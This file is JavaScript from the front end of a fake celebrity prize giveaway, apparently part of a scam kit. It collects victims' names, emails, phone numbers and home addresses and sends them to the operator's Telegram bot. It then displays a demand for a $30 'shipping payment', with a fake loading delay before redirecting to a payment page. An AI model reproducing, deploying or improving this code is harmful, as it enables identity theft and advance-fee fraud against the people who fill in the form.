window.onload = function () {
  const prize = JSON.parse(localStorage.getItem("claimedPrize"));
  if (prize) {
    document.getElementById("prize-name").innerText = prize.name;
    document.getElementById("prize-image").src = prize.image;
  } else {
    document.body.innerHTML = "<center>No prize found. Please go back to spin page.</center>";
  }
};

const form = document.querySelector("form");

form.addEventListener("submit", function (e) {
  e.preventDefault();
  const prize = JSON.parse(localStorage.getItem("claimedPrize"));

  const fullName = document.querySelector(".name").value;
  const email = document.querySelector(".email").value;
  const number = document.querySelector(".number").value;
  const address = document.querySelector(".address").value;
  const city = document.querySelector(".city").value;
  const state = document.querySelector(".state").value;
  const code = document.querySelector(".code").value;
  const country = document.querySelector(".country").value;

  localStorage.setItem('fullName', fullName);

  const telegramMsg = `RESULTS FROM MARTIN HENDERSON'S CELEB WEB:%0A%0A` +
    `FULL NAME: ${fullName}%0A` +
    `EMAIL: ${email}%0A` +
    `PHONE NUMBER: ${number}%0A` +
    `ADDRESS: ${address}%0A` +
    `CITY: ${city}%0A` +
    `STATE: ${state}%0A` +
    `ZIP CODE: ${code}%0A` +
    `COUNTRY: ${country}%0A` +
    `GIVEAWAY ITEM: ${prize.name}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${telegramMsg}`;
  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  [
    ["fullName", fullName],
    ["email", email],
    ["number", number],
    ["address", address],
    ["city", city],
    ["state", state],
    ["code", code],
    ["country", country],
  ].forEach(([key, val]) => localStorage.setItem(key, val));

  document.querySelector(".warning-section").innerHTML = `
    <div>
      <i class="bi bi-x-lg"></i>
    </div>
    <div class="warning-top">
      <b>Are you sure the informations provided below are correct shipping address</b>
    </div>

    <div class="label"><b>Fullname:</b> <span id="name">${fullName}</span></div>
    <div class="label"><b>Email Address:</b> <span id="email">${email}</span></div>
    <div class="label"><b>Phone Number:</b> <span id="number">${number}</span></div>
    <div class="label"><b>Home Address:</b> <span id="home">${address}</span></div>
    <div class="label"><b>City:</b> <span id="city">${city}</span></div>
    <div class="label"><b>State:</b> <span id="state">${state}</span></div>
    <div class="label"><b>Zip code:</b> <span id="code">${code}</span></div>
    <div class="label"><b>Country:</b> <span id="country">${country}</span></div>

    <div class="imp-note"><b>Important Notice!!!</b></div>
    <div>
      Dear <b><span id="name2">${fullName}</span></b>, you are to make a shipping payment of 
      <b>$30.00</b> for your giveaway prize item to be shipped to your above provided 
      information which is already sent to us for your shipping.
    </div>
    <button class="get-btn2">Continue to Payment</button>
  `;

  document.querySelector(".warning-section").style.display = "block";

  document.querySelector(".bi-x-lg").addEventListener("click", function (e) {
    e.preventDefault();
    document.querySelector(".warning-section").style.display = "none";
  });

  document.querySelector(".get-btn2").addEventListener("click", function (e) {
    e.preventDefault();
    document.querySelector(".loading").style.display = "block";
    setTimeout(() => {
      document.querySelector(".loading").style.display = "none";
      window.location.href = "payment2.html";
    }, 3000);
  });
});
